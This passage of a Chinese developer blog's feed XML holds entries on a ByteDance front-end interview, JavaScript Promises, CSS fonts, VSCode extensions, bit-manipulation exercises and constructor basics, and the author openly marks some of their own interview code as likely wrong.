        <content type="html"><![CDATA[<h1 id="字节提前批一面"><a href="#字节提前批一面" class="headerlink" title="字节提前批一面"></a>字节提前批一面</h1><p><img src="/images/post-images/1627480023579.png" alt=""></p><blockquote><p>😅戴了一小时痛苦面具</p></blockquote><p>面试官先来了自我介绍，好像姓李，名忘了，字节教育那一块的。<br>然后我的自我介绍</p><p>开始：</p><ol><li><p>拿出我的简历，问：说说项目难点，我想了想：没啥难点，之前看了点 session，就说这个吧。说了一堆后，感觉表述混乱了，因为面试官一脸懵逼。又反复问了 session 怎么处理的，没问出个所以然来。面试官最后直接问：说说 session 和 cookie 的区别，cookie 不安全，session 就一定安全？怎么做安全防范？</p></li><li><p>HTTP 和 HTTPS，能够详细说一下 HTTPS，加密过程吗？HTTPS 是否只用了对称加密？</p></li><li><p>TCP 为什么需要三次握手，而不是两次，四次？被怼了好久，都感觉自己背的八股到底对不对了</p></li><li><p>经典问题，GET 和 POST 区别。</p></li><li><p>了解 HTTP1.0 和 2.0 吗？说说区别？</p></li><li><p>开始 JS 的题目了。</p></li><li><p>ES6 的 <code>extends</code> 用过吗？</p></li><li><p>说说 <code>prototype</code> 和 <code>__proto__</code></p><pre><code> function test(){ } let obj = {}</code></pre><p> 以上面代码为例，说说上面 test 和 obj 的 <code>prototype</code> 和 <code>__proto__</code></p></li><li><p>给定代码，写继承</p><pre><code> function father(){     this.test = ()=&gt;{         console.log(1)     } } function son(){} let obj = new son() obj.test()</code></pre><p> 让 <code>son</code> 继承 <code>father</code></p></li><li><p>number 类型的数字过大存不下怎么办？是显示 Infinitely 还是截断截取？学过 C 语言和 Java 没有？它们的数值有没有相关问题？</p></li><li><p><code>0.1+0.2</code> 的结果（数值相关的问题追着问我了好久）</p></li><li><p>使用 JS 实现一个 repeat 方法，</p><pre><code>function repeat (func, times, wait) {}，const repeatFunc = repeat(alert, 4, 3000),</code></pre><p>调用这个 repeatedFunc(“hellworld”)，<br>会 <code>alert</code>4 次 helloworld, 每次间隔 3 秒<br>我写的代码：不知道对不对。。。先粘这</p><pre><code>function repeat(func, times, wait) {let t = times;let lock = null;return (arg) =&gt; {        while (times &gt; 0) {            if (lock !== null &amp;&amp; times &gt; 0) {                lock = setInterval(() =&gt;{                func(arg);                times -= 1;                lock = null;            }, wait)            }        }    }}</code></pre></li><li><p>说说基本类型，我写了六个，面试官提示有七个，我说还有 BigInt，只知道存储大整数的。</p></li><li><p>apply,call,bind 的区别</p></li><li><p>你说熟悉 balabala 数据结构，挑一个数据结构，我出个题。我挑的数组。给的是求数组最大序列和，与 leetcode 不同，要求给出最大序列和的具体索引。<br>我当时写的代码：是不对的，先粘这</p><pre><code>function solu(arr) {    let pre = arr[0];    let maxAns = arr[0];    let q = [0];    for (let idx = 1; idx &lt; arr.length; idx++) {        pre = Math.max(pre + arr[idx], arr[idx]);        if (pre === arr[idx]) {            q = [];            q.push(idx);        } else {            q.push(idx-1);            q.push(idx);        }        maxAns = Math.max(pre, maxAns);    }    let res = [];    for (let i of q) {        res.push(arr[i]);    }    return res;}</code></pre></li><li><p>反问，技术栈？我需要补充哪些知识？</p><blockquote><p>面试官： 大部分是 React，也有 Vue，看具体场景。你的基础知识不好。我感觉对应届生来说，上来就要你多少多少框架的公司并不好。计网，HTTP，TCP，JS 的基础问题是面试必定会问的，要多看。基础，JS 基础要多看多练，闭包和原形是重点，原形又会引入继承。框架不用太深入。工作两三年的我才会问框架问题。</p></blockquote></li></ol><ul><li>面试官男的，胖胖的，看起来年纪比我大，或者说老成？全程表情感觉没啥变化。我笑的时候他没表情，感觉很尴尬😅*</li></ul><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol><li>Q T M D 八股文，平时感觉记得好，一到了面试时会结结巴巴，看来还是要尽量理解才能记得准，记得牢。</li><li>JS 砖头书要拿起来啃，但是感觉来不及了啊。</li></ol>]]></content>
      
      
      <categories>
          
          <category> 备忘录 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>了解 Promise - 下</title>
      <link href="2021/07/21/promise-guan-jian-dian/"/>
      <url>2021/07/21/promise-guan-jian-dian/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="then-catch-finally-消费后的返回值"><a href="#then-catch-finally-消费后的返回值" class="headerlink" title="then/catch/finally 消费后的返回值"></a>then/catch/finally 消费后的返回值</h1><p>返回值都是一个 Promise 对象，只是其 statge 属性和 result 属性分为一下几种情况：</p><ol><li>无显示返回值，则默认返回一个 promise 实例对象，其 result 属性就是 undefined，其 state 值取决于之前的 executor 执行的是哪个方法。</li><li>若消费者 – 回调函数抛出错误，则返回的 promise 实例对象的 state 值就是 rejected，其 result 属性值就是错误对象。</li><li>显式写出返回值，且返回值是非 Promise 对象。则 then/catch 方法返回一个 state 值为 resolved 的 promise 实例对象。其 result 属性值就是这个返回值。</li><li>显式返回一个 Promise，相当于又一个轮回。</li></ol><h1 id="如何串联多个任务"><a href="#如何串联多个任务" class="headerlink" title="如何串联多个任务"></a>如何串联多个任务</h1><p> then/catch/finally 消费后的返回值都是一个 Promise 对象，自然可以直接串联。</p><h1 id="错误的穿透效果"><a href="#错误的穿透效果" class="headerlink" title="错误的穿透效果"></a>错误的穿透效果</h1><p><img src="/images/post-images/1627111092243.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 日常编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>又停运了</title>
      <link href="2021/07/21/you-ting-yun-liao/"/>
      <url>2021/07/21/you-ting-yun-liao/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><p>来的时候停运，走的时候又停运，刚才 12306 发短信，列车停运，要我退票了。<br>今年的暴雨是不是有点多啊。。。</p><p><img src="/images/post-images/1626839114729.png" alt=""></p><p>郑州好像是几十年一遇的大雨。。。<br>祝大家平安吧</p>]]></content>
      
      
      <categories>
          
          <category> 备忘录 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Promise 函数的方法</title>
      <link href="2021/07/20/promise-han-shu-de-fang-fa/"/>
      <url>2021/07/20/promise-han-shu-de-fang-fa/</url>
      
        <content type="html"><![CDATA[<p><code>Promise.resolve&amp;reject&amp;all&amp;race</code></p><a id="more"></a><h1 id="Promise-resolve"><a href="#Promise-resolve" class="headerlink" title="Promise.resolve"></a>Promise.resolve</h1><p>此函数返回 proimise 对象，参数分两种情况</p><ul><li>参数是 Promise 对象实例时，返回的这个 promise 实例<pre><code>let promise = new Promise((resolve, reject) =&gt; {  // resolve(&quot;OK&quot;);  reject(&quot;NOOOO&quot;)});let p1 = Promise.resolve(promise);p1.then(value =&gt; {  console.log(value);}).catch(reason =&gt; {  console.log(reason);})</code></pre></li><li>resolve 参数是非 promise 对象实例，返回的 promise 实例一律变为 resolve(fulfilled) 状态<pre><code>let p2 = Promise.resolve(new Error(&quot;错错了。。。&quot;))p2.then(value =&gt; {  console.log(&#39;value:&#39; + value);}).catch(reason =&gt; {  console.log(&quot;reason:&quot;, reason);})输出：value: Error: 错错了。。。Promise {&lt;fulfilled&gt;: undefined}</code></pre></li></ul><h1 id="Promise-reject"><a href="#Promise-reject" class="headerlink" title="Promise.reject"></a>Promise.reject</h1><p>传入任何值，得到的都是 rejected 实例对象</p><pre><code>let p1 = Promise.reject(123);console.dir(p1);  //Promise { &lt;rejected&gt; 123 }p1.catch(reason =&gt; {    console.log(reason);});let p2 = Promise.reject(new Promise(resolve =&gt; {    resolve(123)}))console.dir(p2);  //Promise { &lt;rejected&gt; Promise { 123 } }</code></pre><h1 id="Promise-all"><a href="#Promise-all" class="headerlink" title="Promise.all"></a>Promise.all</h1><p>当其接收的数组中全部 all 的 promise 状态 state 为 fulfilled 时，其状态才是 fulfilled，否则就是 rejected。<br>fulfilled 时，promise 的 result 值为这些数组元素 fulfilled 得到的值组成的数组：<br><img src="/images/post-images/1626854161814.png" alt=""></p><h1 id="Promise-race"><a href="#Promise-race" class="headerlink" title="Promise.race"></a>Promise.race</h1><p>谁是第一个？<br>race 同 all 一样，接收 promise 实例对象组成的数组，但是返回的 promise 只有第一个执行完的 promise 的结果。<br>第一个执行完的 promise 执行的不管是 resolve 或者 reject，都是 race 的结果。</p>]]></content>
      
      
      <categories>
          
          <category> 日常编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSS 字体设置</title>
      <link href="2021/07/19/css-zi-ti-she-zhi/"/>
      <url>2021/07/19/css-zi-ti-she-zhi/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="font-family"><a href="#font-family" class="headerlink" title="font-family"></a>font-family</h1><blockquote><p>属性值用逗号隔开。浏览器会选择列表中第一个该计算机上有安装的字体，或者是通过 <code>@font-face</code> 指定的可以直接下载的字体。</p></blockquote><p> font-family 可以设置字体的通用的字体族名，确保至少满足这个条件让浏览器选择在这个字体族中的字体：</p><ul><li>serif 衬线字体</li><li>sans-serif 非衬线字体</li><li>monospace 等宽字体</li></ul><p>字体名字中间有空格时，字体名字要放在单引号内。</p><h1 id="font-size"><a href="#font-size" class="headerlink" title="font-size"></a>font-size</h1><p>该属性的值会被用于计算 em 和 ex 长度单位，定义该值可能改变其他元素的大小。</p><ul><li>绝对大小 small，medium，large</li><li>相对大小 larger，smaller</li><li>长度值，em，rem，px</li><li>百分比值</li><li>inherit，继承</li></ul><p>推荐使用 em。因为 em 可以自动适应用户的字体，em 是一个非常有用的 CSS 单位。</p><blockquote><p>em: em 值的大小是动态的。当定义或继承 font-size 属性时，1em 等于该元素的字体大小。如果你在网页中任何地方都没有设置文字大小的话，那它将等于浏览器默认文字大小，通常是 16px。所以通常 1em = 16px。2em = 32px。 如果你设置了 body 元素的字体大小为 20px，那 1em = 20px、2em = 40px。那个 2 就是当前 em 大小的倍数。</p></blockquote><p>一个常用技巧：</p><pre><code>body {  font-size: 62.5%; /* font-size 1em = 10px */}p {  font-size: 1.6em; /* 1.6em = 16px */}</code></pre><h1 id="实际使用"><a href="#实际使用" class="headerlink" title="实际使用"></a>实际使用</h1><p>例如京东的设置：<br><img src="/images/post-images/1626666436958.png" alt=""><br>淘宝的设置：<br><img src="/images/post-images/1626666447195.png" alt=""><br>可以发现，都在 body 里进行设置字体，这说明，字体属性是可以继承的。</p><h1 id="font-face"><a href="#font-face" class="headerlink" title="@font-face"></a><code>@font-face</code></h1><p>让浏览器下载并使用服务器提供的字体。<br>注意版权问题，因为字体保存在了服务器中。</p>]]></content>
      
      
      <categories>
          
          <category> 日常编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VSCode 的文件管理好用吗？</title>
      <link href="2021/07/19/vscode-de-wen-jian-guan-li-hao-yong-ma/"/>
      <url>2021/07/19/vscode-de-wen-jian-guan-li-hao-yong-ma/</url>
      
        <content type="html"><![CDATA[<p>起码对于键盘操作来说不好用，可以使用更好用的扩展替代。</p><a id="more"></a><h1 id="VSCode-可以做到的"><a href="#VSCode-可以做到的" class="headerlink" title="VSCode 可以做到的"></a>VSCode 可以做到的</h1><ul><li>搜索并打开文件：<code>Ctrl+P</code> 后输入文件名即可。</li></ul><h1 id="扩展一：advanced-new-file"><a href="#扩展一：advanced-new-file" class="headerlink" title="扩展一：advanced new file"></a>扩展一：advanced new file</h1><p>注意，有相同名字的，别选错了：<br><img src="/images/post-images/1626661214094.png" alt=""></p><p>更方便地创建文件 or 目录</p><p>默认快捷键是 <code>Ctrl+Shift+N</code><br>弹出一个输入框，选择目录后，输入目录 or 文件名，目录与文件区别是，目录后面跟着一个 <code>\</code> 反斜杠。<br>不过，这个只能创建文件。</p><h1 id="扩展二：File-Utils"><a href="#扩展二：File-Utils" class="headerlink" title="扩展二：File Utils"></a>扩展二：File Utils</h1><p>顾名思义，不仅仅能创建文件了，还可以修改文件名，删除文件，移动文件等等。（使用 Ctrl+P 打开文件后，再用 Ctrl+Shift+P，输入 File Utils，选择相应的操作即可）</p><p>甚至可以同时创建多个文件（在 VSCode 扩展商店的介绍里）。</p><p><img src="/images/post-images/1626661646979.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 日常编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IDE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>了解 Promise - 上</title>
      <link href="2021/07/15/liao-jie-promise/"/>
      <url>2021/07/15/liao-jie-promise/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="Promise-对象的构造器"><a href="#Promise-对象的构造器" class="headerlink" title="Promise 对象的构造器"></a>Promise 对象的构造器</h1><p>Promise 对象的构造器语法如下：</p><pre><code class="javascript">let promise = new Promise(function (resolve, reject) {    console.log(&quot;执行 1&quot;);  // 生产者代码，想象成一个“歌手”})</code></pre><p>传递给 <code>new Promise</code> 的函数被称为 <code>executor</code>。<br>当 <code>new Promise</code> 被创建，<code>executor</code> 会自动运行。它包含最终应产出结果的生产者代码。按照上面的类比：<code>executor</code> 就是“歌手”。<br><code>executor</code> 的参数 <code>resolve</code> 和 <code>reject</code> 是由 JavaScript 自身提供的回调函数。我们的代码仅在 executor 的内部。</p><p>当 executor 获得了结果，无论是早还是晚都没关系，它应该调用以下两个回调之一：</p><ul><li><code>resolve(value)</code> 任务成功，value 是执行任务得到的结果</li><li><code>reject(error)</code> 任务出错，error 是代表错误的对象</li></ul><p>总结一下，executor 会自动执行工作任务。任务结束后，成功则调用 resolve，失败调用 reject。</p><h1 id="承诺的状态变化"><a href="#承诺的状态变化" class="headerlink" title="承诺的状态变化"></a>承诺的状态变化</h1><p>构造器 <code>new Promise</code> 返回的 promise<code>对象实例</code> 有以下两个重要的 <code>内部属性</code>：</p><ul><li><code>state</code>: 最初是“pending”，当 resolve 被调用时，是“fulfilled”。当 reject 被调用时，是“rejected”</li><li><code>result</code>：最初是“undefined”，当 <code>resolve(value)</code> 被调用时其值是 <code>value</code>。当 <code>reject(error)</code> 被调用时，值是“error”。其他方法无法修改 result 值</li></ul><p>总结，executor 最终将 promise 变为以下状态之一：<br><img src="/images/post-images/1626331356254.png" alt=""></p><h1 id="代码举例"><a href="#代码举例" class="headerlink" title="代码举例"></a>代码举例</h1><p>一个 promise 构造器和一个简单的 executor 函数：</p><pre><code class="javascript">console.log(&quot;主线程 1&quot;);let promise = new Promise(function (resolve, reject) {    // 当 promise 被构造完成时，自动执行此函数    console.log(&quot;executor 被立即调用&quot;);    // 1000ms 后发出任务完成信号, 成功结果 value 为 &quot;成功完成&quot;    setTimeout(() =&gt; {        resolve(&quot;成功完成&quot;);    }, 1000)})console.log(&quot;主线程 2&quot;);// 主线程 1// executor 被立即调用// 主线程 2</code></pre><p>我们可以看出两件事儿：</p><ul><li>executor 被立即调用（同步执行）</li><li>resolve 和 reject 两个函数由 JavaScipt 引擎预先定义。我们只需要在合适的时机去调用其中之一即可。</li></ul><p>经过 1 秒的 “处理” 后，executor 调用 resolve(“done”) 来产生结果。这将改变 promise 对象的状态：<br><img src="/images/post-images/1626331884926.png" alt=""><br>这是一个成功完成任务的例子，一个“成功实现了的诺言”。</p><p>再来一个 executor 以 error 拒绝承诺的例子：</p><pre><code class="javascript">console.log(&quot;主线程 1&quot;);let promise = new Promise(function (resolve, reject) {    console.log(&quot;执行了&quot;);    setTimeout(() =&gt; {        reject(new Error(&quot;出错了!&quot;));    }, 1000);})console.log(&quot;主线程 1&quot;);</code></pre><p>输出信息如下：<br><img src="/images/post-images/1626332163461.png" alt=""><br>promise 对象的状态：<br><img src="/images/post-images/1626332249345.png" alt=""></p><p>executor 执行的一般是异步任务，然后调用 resolve 或者 reject 来改变对应的 promise 对象的状态。<br>一个调用了 resolved 或 rejected 的 promise 都会被称为 “settled”的 promise。</p><h1 id="细节"><a href="#细节" class="headerlink" title="细节"></a>细节</h1><p>一些细节问题。</p><h2 id="状态可以反复横跳吗？"><a href="#状态可以反复横跳吗？" class="headerlink" title="状态可以反复横跳吗？"></a>状态可以反复横跳吗？</h2><p>executor 只能调用一个 resolve 或一个 reject 。任何状态的更改都是最终的。<br>调用之后所有其他的再对 resolve 和 reject 的调用都会被忽略！<br>例如：</p><pre><code class="javascript">console.log(&quot;主线程 1&quot;);let promise = new Promise(function (resolve, reject) {    console.log(&quot;执行&quot;);    setTimeout(() =&gt; {        resolve(&quot;任务成功&quot;);        console.log(&quot;继续执行 1&quot;);        resolve(&quot;再次成功&quot;);// 忽略        console.log(&quot;继续执行 2&quot;);    }, 1000);    setTimeout(() =&gt; {        reject(new Error(&quot;任务失败!&quot;));// 忽略        console.log(&quot;继续执行 3&quot;);        reject(new Error(&quot;再次失败!&quot;));// 忽略        console.log(&quot;继续执行 4&quot;);    }, 1000);});console.log(&quot;主线程 2&quot;);// 主线程 1// 执行// 主线程 2// 继续执行 1// 继续执行 2// 继续执行 3// 继续执行 4</code></pre><p>宗旨是，一个被 executor 完成的工作只能有一个 resolve 或一个 error。<br>并且， resolve/reject 只需要一个参数（或不包含任何参数），并且将忽略额外的参数.</p><h2 id="reject-参数必须是-Error-对象？"><a href="#reject-参数必须是-Error-对象？" class="headerlink" title="reject 参数必须是 Error 对象？"></a>reject 参数必须是 Error 对象？</h2><p>可以使用任何类型的参数来完成（就像 resolve 一样）。<br>但是建议使用 Error 对象（或继承自 Error 的对象）。这样做的理由很快就会显而易见。</p><h2 id="resolve-和-reject-可以立即执行"><a href="#resolve-和-reject-可以立即执行" class="headerlink" title="resolve 和 reject 可以立即执行"></a>resolve 和 reject 可以立即执行</h2><p>executor 通常是异步执行某些操作，并在一段时间后调用 resolve/reject ，但这不是必须的。<br>我们还可以立即调用 resolve 或 reject ，就像这样：</p><pre><code class="javascript">let promise = new Promise(function(resolve, reject) {    // 不花时间去做这项工作    resolve(123); // 立即给出结果：123});</code></pre><h2 id="state-和-result-都是内部的"><a href="#state-和-result-都是内部的" class="headerlink" title="state 和 result 都是内部的"></a>state 和 result 都是内部的</h2><p>我们无法直接访问它们。但我们可以对它们使用 .then / .catch / .finally 方法</p><h2 id="resolve、reject-会导致-executor-函数返回吗"><a href="#resolve、reject-会导致-executor-函数返回吗" class="headerlink" title="resolve、reject 会导致 executor 函数返回吗"></a>resolve、reject 会导致 executor 函数返回吗</h2><p>不会。问这个问题看来你还是没真正懂。resolve 与 reject 都是 JavaScript 负责调用的，不会直接导致 executor 函数返回。就算那种没有异步任务，立即执行的 resolve，其后面的代码也会继续执行。</p><pre><code class="javascript">console.log(1);let promise = new Promise(function (resolve, reject) {    resolve(&#39;DDOONNEE&#39;);    console.log(&quot;3&quot;);});console.log(2);打印132</code></pre><h1 id="消费者：then，catch，finally"><a href="#消费者：then，catch，finally" class="headerlink" title="消费者：then，catch，finally"></a>消费者：then，catch，finally</h1><p>Promise 对象充当的是 executor（“生产者代码”或“歌手”）和消费函数（“粉丝”）之间的桥梁，消费函数将接收结果或 error。<br>消费函数一般是：then，catch，finally</p><h2 id="then"><a href="#then" class="headerlink" title="then"></a>then</h2><p>最重要最基础的一个消费函数</p><p>语法：</p><pre><code class="javascript">promise 对象. then(function(result) { /* 处理成功后的结果 */ },function(error) { /* 处理错误 */ });</code></pre><ul><li>第一个参数是一个函数，该函数将在 promise resolved 后运行并接收 result</li><li>第二个参数也是一个函数，该函数将在 promise rejected 后运行并接收 error。</li></ul><p>示例：</p><pre><code class="javascript">console.log(&quot;主线程 1&quot;);let promise = new Promise(function (resolve, reject) {    setTimeout(() =&gt; {        resolve(&quot;任务成功&quot;);    }, 1000);})console.log(&quot;主线程 2&quot;);promise.then(    function (result) {        // 处理成功的结果        console.log(result);    },    function (error) {        // 处理错误        console.log(error);    })console.log(&quot;主线程 3&quot;);// 主线程 1// 主线程 2// 主线程 3// 任务成功</code></pre><p>可以看出，then 在任务执行结束后被执行，所以也是异步的。<br>第一个参数函数被执行，在 reject 的情况下，运行第二个：</p><pre><code class="javascript">主线程 1主线程 2主线程 3Error: 出错了!    at Timeout._onTimeout (E:\My-FrontEND-Way \ 现 代 JSinfo\JS 篇 \ Promise\1 - 消费者 1-then\0 - 成功时消费.js:5:16)    at listOnTimeout (internal/timers.js:549:17)     at processTimers (internal/timers.js:492:7) </code></pre><p>如果我们只对成功的情况感兴趣，那么我们可以只为 .then 提供一个函数参数：</p><pre><code class="javascript">let promise = new Promise(resolve =&gt; {    setTimeout(() =&gt; resolve(&quot;done!&quot;), 1000);});promise.then(alert); // 1 秒后显示 &quot;done!&quot;</code></pre><p>如果我们只对 error 感兴趣，那么我们可以使用 null 作为第一个参数：</p><pre><code class="javascript"> .then(null,errorHandlingFunction) 。</code></pre><h3 id="then-可以写多个，并且状态改变时，都会被调用"><a href="#then-可以写多个，并且状态改变时，都会被调用" class="headerlink" title="then 可以写多个，并且状态改变时，都会被调用"></a>then 可以写多个，并且状态改变时，都会被调用</h3><pre><code class="javascript">let p = Promise.resolve(&quot;OKKKK&quot;)p.then(value =&gt; {    console.log(&quot;then 1&quot;, value);})p.then(value =&gt; {    console.log(&quot;then 2&quot;, value);})</code></pre><p>输出：</p><pre><code class="javascript">then 1 OKKKKthen 2 OKKKK</code></pre><h2 id="catch"><a href="#catch" class="headerlink" title="catch"></a>catch</h2><p>如果我们只对 error 感兴趣, 也可以使用 <code>.catch(errorHandlingFunction)</code></p><p><code>.catch(f)</code> 调用是 <code>.then(null, f)</code> 的完全的模拟，它只是一个简写形式。</p><h2 id="finally"><a href="#finally" class="headerlink" title="finally"></a>finally</h2><p>.finally(f) 调用与 .then(f, f) 类似，在某种意义上， f 总是在 promise 被 settled 时运行：即 promise 被 resolve 或 reject 之后。<br>finally 是执行清理（cleanup）的很好的处理程序（handler）</p><pre><code class="javascript">console.log(&quot;主线程 1&quot;);let promise = new Promise(function (resolve, reject) {    console.log(&quot;任务 1 要执行了&quot;);    setTimeout(() =&gt; {        resolve(&quot;我是任务 1 成功执行后的结果&quot;);        // reject(&quot;出错了&quot;);    }, 1000);})console.log(&quot;主线程 2&quot;);promise.finally(function () {    console.log(&quot;清理任务 1 占用的系统资源&quot;);}).then(    function (result) {        // 继续处理上一个 promise 的结果        console.log(&quot;pormise 1 的 then 的任务成功处理函数:&quot; + result);        console.log(&quot;pormise 1 的 then 的任务成功处理函数处理完毕&quot;);    },    function (error) {    })console.log(&quot;主线程 3&quot;);</code></pre><p>执行结果：</p><pre><code>主线程 1任务 1 要执行了主线程 2主线程 3清理任务 1 的资源pormise 1 的 then 的任务成功处理函数: 我是任务 1 成功 成功执行后的结果pormise 1 的 then 的任务成功处理函数处理完毕     </code></pre><p>finally(f) 其实并不是 then(f,f) 的别名。它们之间有一些细微的区别 /</p><ul><li>finally 的 f 函数没有参数。在 finally 内，我们不知道 promise 是成功还是失败，只知道 promise 被 settled 了</li><li>finally 将 resolve 接收到的 value 或者 reject 接收到的 error 传递给下一个消费者。</li></ul><p>finally 目的并不是处理 promise 的结果。所以将 promise 结果传递给了后面的消费者。</p><h1 id="实际代码"><a href="#实际代码" class="headerlink" title="实际代码"></a>实际代码</h1><p>接下来，让我们看一下关于 promise 如何帮助我们编写异步代码的。<br>用于加载脚本的 loadScript 函数，基于回调：</p><pre><code class="javascript">function loadScript(src, callback) {    let script = document.createElement(&#39;script&#39;);    script.src = src;    script.onload = () =&gt; callback(null, script);    script.onerror = () =&gt; callback(new Error(`Script load error for ${src}`));    document.head.append(script);}</code></pre><p>让我们用 promise 重写它。<br>新函数 loadScript 将不需要 callback 函数。取而代之的是，它将创建并返回一个在加载完成时解析（resolve）的 promise 对象。外部代码可以使用 .then 向其添加处理程序（订阅函数）：</p><pre><code class="javascript">function loadScript(src) {    return new Promise(function(resolve, reject) {        let script = document.createElement(&#39;script&#39;);        script.src = src;        script.onload = () =&gt; resolve(script);        script.onerror = () =&gt; reject(new Error(`Script load error for ${src}`));        document.head.append(script);});}</code></pre><p>之后，可以调用 then：</p><pre><code>let promise = loadScript(&quot;https://cdnjs.cloudflare.com/ajax/libs/lodash.js/4.17.11/lodash.js&quot;);promise.then(    script =&gt; alert(`${script.src} is loaded!`),    error =&gt; alert(`Error: ${error.message}`));promise.then(script =&gt; alert(&#39;Another handler...&#39;));</code></pre>]]></content>
      
      
      <categories>
          
          <category> 日常编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>位运算</title>
      <link href="2021/07/14/wei-yun-suan/"/>
      <url>2021/07/14/wei-yun-suan/</url>
      
        <content type="html"><![CDATA[<p>涉及到位运算的数据结构与算法题。</p><a id="more"></a><h1 id="题目一"><a href="#题目一" class="headerlink" title="题目一"></a>题目一</h1><blockquote><p>该题很容易出现在各大厂的面试中，属于必须掌握的题型。</p></blockquote><p>题目描述：</p><blockquote><p>求 1 至 n 连续 n 个数的和。要求不能使用乘除法、for、while、if、else、switch、case 等关键字及条件判断语句（A?B:C）。<br>1 &lt;= n &lt;= 10000</p></blockquote><p>解法一：<br>直接等差求和公式显然不行，因为包含乘除法。不行。吗？逻辑右移搞定！</p><p>代码：</p><pre><code>// 套公式加位运算function sumF(n) {    return (Math.pow(n, 2) + n) &gt;&gt;&gt; 1;  // 无符号右移，不过这里有没有符号都一样，因为 n 是正整数}</code></pre><p>解法二：</p><p>递归要有终止条件，需要 if 判断，也不行。吗？可以使用逻辑判断运算符绕过！嘻嘻</p><p>为了对比，先写一个无限制的递归版吧：</p><pre><code>// 正常递归版function sumN(n) {    if (n &lt;= 0) {        return 0;    }    return n + sumN(n - 1);}</code></pre><p>使用逻辑或运算：</p><pre><code>// 使用逻辑运算function sumH(n) {    return n &gt; 0 &amp;&amp; (n + (sumH(n - 1)));}</code></pre><p>这里利用了 JavaScript 逻辑运算的特殊性。即逻辑运算返回值保持表达式原值！</p><h1 id="题目二"><a href="#题目二" class="headerlink" title="题目二"></a>题目二</h1><blockquote><p>给定一个整数 n，编写一个函数来判断它是否是 2 的幂次方。<br>$-2^{31} &lt;= n &lt;= 2^{31} - 1$<br>进阶：你能够不使用循环 / 递归解决此问题吗？</p></blockquote><p>解法一：<br>利用位运算中的按位或运算。2 的幂都是首 1 全 0 的二进制。<br>while 循环加位运算：</p><pre><code>function is2(n) {    if (n &lt;= 0) {        return false;    }    while (true) {        if (n === 1) {            return true;        }        if (n &amp; 1 === 1) {            // 说明 n 的二进制表示中最后一个二进制位是 1            return false;        }        n = n &gt;&gt;&gt; 1;    }}</code></pre><p>解法二：<br>利用 2 的幂的二进制，减去一，是全 1 的二进制。</p><pre><code>var isPowerOfTwo = function(n) {    return n &gt; 0 &amp;&amp; (n &amp; (n-1)) === 0;};</code></pre><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul><li>和小浩学算法. pdf</li></ul>]]></content>
      
      
      <categories>
          
          <category> 算法笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>构造器和操作符 new-Object 基础</title>
      <link href="2021/07/14/gou-zao-qi-he-cao-zuo-fu-new/"/>
      <url>2021/07/14/gou-zao-qi-he-cao-zuo-fu-new/</url>
      
        <content type="html"><![CDATA[<p>一直不太理解的东西。</p><a id="more"></a><h1 id="构造函数"><a href="#构造函数" class="headerlink" title="构造函数"></a>构造函数</h1><p>看起来和普通函数就一样。</p><ul><li>命名大写字母开头</li><li>只能由 “new” 操作符执行</li></ul><p>当一个函数由 “new” 操作符执行时，按照一下流程：</p><ol><li>一个新的空对象被创建并分配给 this。</li><li>函数体执行。通常函数体会修改 this，如，添加属性。</li><li>返回 this 的值。</li></ol><pre><code>function User(name) {    this.name = name;    this.isAdmin = false;}</code></pre><p>执行 <code>new User(...)</code> 做的就是：</p><pre><code>function User(name) {    // this = {}; 隐式创建    // 修改 this。这里是添加了两个属性    this.name = name;    this.isAdmin = false;    // return this； 隐式返回}</code></pre><p>比每次都使用字面量创建要短得多，而且更易于阅读。<br>这是构造器的主要目的，** 实现可重用的对象创建代码 **。</p><blockquote><p>从技术上讲，任何函数都可以用作构造器。即：任何函数都可以通过 <code>new</code> 来运行，它会执行上面的三个步骤</p></blockquote><h1 id="构造函数的-return-返回值"><a href="#构造函数的-return-返回值" class="headerlink" title="构造函数的 return 返回值"></a>构造函数的 return 返回值</h1><p> 明确写出 return 语句时：</p><ol><li>若返回的是一个对象，则就返回此对象</li><li>若返回的是一个基本类型，则此 return 被忽略。</li></ol><p>换句话说，带有对象的 return 返回该对象，在所有其他情况下返回 this 。</p><pre><code>function A() {    this.age = 99;    return { age: 19 };}function B() {    this.arr = [1, 2, 3];    return [4, 5, 6];}function C() {    this.name = &#39;TOM&#39;;    return &#39;John&#39;;}let a = new A();let b = new B();let c = new C();console.log(a);// { age: 19 }  丢失 thisconsole.log(b);// [ 4, 5, 6 ]  丢失 thisconsole.log(c); // C { name: &#39;TOM&#39; }  还是 this</code></pre><h1 id="构造器中的方法"><a href="#构造器中的方法" class="headerlink" title="构造器中的方法"></a>构造器中的方法</h1><p>我们不仅可以将属性添加到 <code>this</code> 中，还可以添加方法到 <code>this</code> 中。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul><li><a href="https://zh.javascript.info/" target="_blank" rel="noopener">https://zh.javascript.info/</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 日常编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>排序</title>
      <link href="2021/07/13/pai-xu/"/>
      <url>2021/07/13/pai-xu/</url>
      
